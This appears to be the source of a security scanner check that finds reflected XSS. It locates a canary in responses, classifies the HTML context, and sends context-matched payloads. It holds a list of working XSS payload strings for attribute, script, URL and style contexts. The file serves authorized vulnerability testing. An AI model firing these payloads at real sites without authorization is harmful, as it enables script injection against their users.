"""Context-aware reflected XSS detection.

Instead of blindly reflecting generic payloads, this check:
  1. Injects a unique CANARY string into each parameter
  2. Locates the canary in the reflected response
  3. Determines the HTML context (text, attribute value, JS string, URL)
  4. Selects context-appropriate payloads for that exact context

This dramatically reduces false positives (vs. naive "payload in response")
and catches XSS that generic scanners miss because the payload must be
crafted for the specific reflection point.
"""
import random
import string
import httpx
import re
from modules.scanner.base_check import BaseCheck, CheckResult
from urllib.parse import urlparse, parse_qsl, urlencode

# Context-specific payloads, mapped to the reflection context.
_CONTEXT_PAYLOADS: dict[str, list[str]] = {
    # Reflected inside an HTML tag attribute value (double-quoted)
    "attr_double": [
        '"><script>alert(document.domain)</script>',
        '"><img src=x onerror=alert(1)>',
        '" autofocus onfocus=alert(1) x="',
    ],
    # Reflected inside an HTML attribute value (single-quoted)
    "attr_single": [
        "'><script>alert(document.domain)</script>",
        "' autofocus onfocus=alert(1) x='",
    ],
    # Reflected in a raw text node (between tags)
    "text_node": [
        '<script>alert(document.domain)</script>',
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(document.domain)>',
    ],
    # Reflected inside a <script> block (JS string context)
    "js_string": [
        '";alert(document.domain);//',
        "'-alert(document.domain)-'",
        '</script><script>alert(document.domain)</script>',
    ],
    # Reflected inside a JS template literal
    "js_template": [
        '${alert(document.domain)}',
        '`-alert(document.domain)-`',
    ],
    # Reflected inside an href/src URL
    "url_attr": [
        'javascript:alert(document.domain)',
        'data:text/html,<script>alert(1)</script>',
    ],
    # Reflected inside an event handler attribute
    "event_handler": [
        'alert(document.domain)',
        'alert(1)//',
    ],
    # Reflected inside a <style> or style attribute
    "style": [
        '</style><script>alert(document.domain)</script>',
        'expression(alert(1))',
    ],
}

# Patterns to identify the reflection context around a canary match.
# ORDER MATTERS: more specific contexts (URL, event handler, JS, style) must
# be checked before generic attribute patterns, otherwise `href="canary"`
# is misclassified as a plain double-quoted attribute.
_CONTEXT_PATTERNS: list[tuple[str, re.Pattern]] = [
    # URL attribute (href/src/action/formaction) — most specific
    ("url_attr", re.compile(r'(?:href|src|action|formaction)=["\']?[^"\'>\s]*\{CANARY\}[^"\'>\s]*["\']?', re.IGNORECASE)),
    # Event handler (onclick=, onload=, etc.)
    ("event_handler", re.compile(r'on\w+=["\'][^"\']*\{CANARY\}[^"\']*["\']', re.IGNORECASE)),
    # JS string: inside quotes within a <script> block
    ("js_string", re.compile(r"<script[^>]*>(?:[^<]*?)(?:\"|')([^\"']*\{CANARY\}[^\"']*)(?:\"|')", re.IGNORECASE | re.DOTALL)),
    # JS template literal
    ("js_template", re.compile(r"`[^`]*\{CANARY\}[^`]*`", re.IGNORECASE)),
    # Style
    ("style", re.compile(r'<style[^>]*>[^<]*\{CANARY\}[^<]*</style>|style=["\'][^"\']*\{CANARY\}[^"\']*["\']', re.IGNORECASE)),
    # Attribute double-quoted: canary preceded by =" or ="value..."
    ("attr_double", re.compile(r'="[^"]*\{CANARY\}[^"]*"', re.IGNORECASE)),
    # Attribute single-quoted
    ("attr_single", re.compile(r"='[^']*\{CANARY\}[^']*'", re.IGNORECASE)),
    # Text node (between > and <) — most generic, checked last
    ("text_node", re.compile(r'>[^<]*\{CANARY\}[^<]*<', re.IGNORECASE)),
]


class ActiveXssContextCheck(BaseCheck):
    """Context-aware reflected XSS detection."""

    name = "active_xss_context"

    @staticmethod
    def _canary() -> str:
        return "".join(random.choices(string.ascii_lowercase + string.digits, k=10))

    def _detect_context(self, body: str, canary: str) -> str | None:
        """Determine the reflection context for a canary in the body."""
        # Find the exact position of the canary
        idx = body.find(canary)
        if idx == -1:
            return None

        # Look at surrounding context for each pattern
        window_start = max(0, idx - 200)
        window_end = min(len(body), idx + 200)
        window = body[window_start:window_end]

        # Substitute the canary into each pattern (escape for regex safety)
        escaped_canary = re.escape(canary)
        for context, pattern in _CONTEXT_PATTERNS:
            # Replace the literal {CANARY} placeholder with the real canary
            pattern_text = pattern.pattern.replace(r"\{CANARY\}", escaped_canary)
            if re.search(pattern_text, window, flags=re.IGNORECASE | re.DOTALL):
                return context

        # Default: canary is reflected but context unknown
        return "text_node"

    async def run(self, base_request: dict, target_params: list[str]) -> list[CheckResult]:
        results: list[CheckResult] = []

        async with httpx.AsyncClient(verify=False, timeout=10) as client:
            for param in target_params:
                # ── Step 1: inject canary ────────────────────────────
                canary = self._canary()
                probe_req = self._inject_payload(base_request, param, canary)
                try:
                    probe_resp = await client.request(**probe_req)
                except Exception:
                    continue

                body = probe_resp.text or ""
                if canary not in body:
                    continue  # not reflected — skip

                # ── Step 2: detect context ───────────────────────────
                context = self._detect_context(body, canary)
                if not context:
                    continue

                # ── Step 3: fire context-appropriate payloads ───────
                payloads = _CONTEXT_PAYLOADS.get(context, _CONTEXT_PAYLOADS["text_node"])
                for payload in payloads:
                    try:
                        modified = self._inject_payload(base_request, param, payload)
                        resp = await client.request(**modified)
                        resp_body = resp.text or ""
                        # XSS confirmed if the payload is reflected back verbatim
                        # (unencoded) in an executable position
                        if payload in resp_body:
                            results.append(CheckResult(
                                triggered=True,
                                severity="high",
                                title=f"Reflected XSS (context: {context})",
                                description=(
                                    f"Parameter '{param}' reflects unsanitized input in "
                                    f"'{context}' context and executes injected markup."
                                ),
                                evidence=(
                                    f"Context: {context}\n"
                                    f"Payload: {payload}\n"
                                    f"Status: {resp.status_code}"
                                ),
                                remediation=(
                                    "Context-aware output encoding: HTML-entity encode for "
                                    "text nodes, attribute-encode for attributes, JS-encode "
                                    "for script contexts, URL-encode for hrefs. Use a "
                                    "Content-Security-Policy as defense in depth."
                                ),
                                cwe="CWE-79",
                            ))
                            break  # One confirmed payload per context per param
                    except Exception:
                        continue

        return results

    def _inject_payload(self, base: dict, param: str, payload: str) -> dict:
        import copy
        req = copy.deepcopy(base)
        parsed = urlparse(req["url"])
        params = dict(parse_qsl(parsed.query))
        if param in params:
            params[param] = payload
            req["url"] = parsed._replace(query=urlencode(params)).geturl()
        return req